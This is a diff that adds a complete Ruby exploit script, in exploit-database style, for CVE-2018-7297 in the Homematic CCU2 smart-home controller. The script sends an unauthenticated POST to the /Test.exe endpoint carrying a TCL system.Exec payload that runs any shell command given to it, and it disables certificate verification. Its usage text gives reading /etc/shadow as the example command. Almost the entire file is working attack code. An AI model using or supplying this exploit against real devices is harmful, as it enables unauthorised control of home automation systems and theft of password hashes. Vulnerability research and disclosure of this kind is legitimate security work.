@@ -1,0 +1,61 @@
+#!/usr/bin/ruby
+
+# Exploit Title: Homematic CCU2 Remote Command Execution
+# Date: 28-03-18
+# Exploit Author: Patrick Muench, Gregor Kopf
+# Vendor Homepage: http://www.eq-3.de
+# Software Link: http://www.eq-3.de/service/downloads.html?id=268
+# Version: 2.29.23
+# CVE : 2018-7297
+
+# Description: http://atomic111.github.io/article/homematic-ccu2-remote-code-execution
+
+require 'net/http'
+require 'net/https'
+require 'uri'
+
+unless ARGV.length == 2
+  STDOUT.puts <<-EOF
+Please provide url and the command, which is execute on the homematic
+
+Usage:
+  execute_cmd.rb <ip.adress> <homematic command>
+
+Example:
+  execute_cmd.rb https://192.168.1.1 "cat /etc/shadow"
+
+  or
+
+  execute_cmd.rb http://192.168.1.1 "cat /etc/shadow"
+
+EOF
+  exit
+end
+
+# The first argument specifies the URL and if http or https is used
+url = ARGV[0] + "/Test.exe"
+
+# The second argument specifies the command which is executed via tcl interpreter
+tcl_command = ARGV[1]
+
+# define body content
+body = "string stdout;string stderr;system.Exec(\"" << tcl_command << "\", &stdout, &stderr);WriteLine(stdout);"
+
+# split uri to access it in a easier way
+uri = URI.parse(url)
+
+# define target connection, disabling certificate verification
+Net::HTTP.start(uri.host, uri.port, :use_ssl => uri.scheme == 'https', :verify_mode => OpenSSL::SSL::VERIFY_NONE) do |http|
+
+  # define post request
+  request = Net::HTTP::Post.new(uri.request_uri)
+
+  # define the request body
+  request.body = body
+
+  # send the request to the homematic ccu2
+  response = http.request(request)
+
+  # print response to cli
+  puts response.body
+end
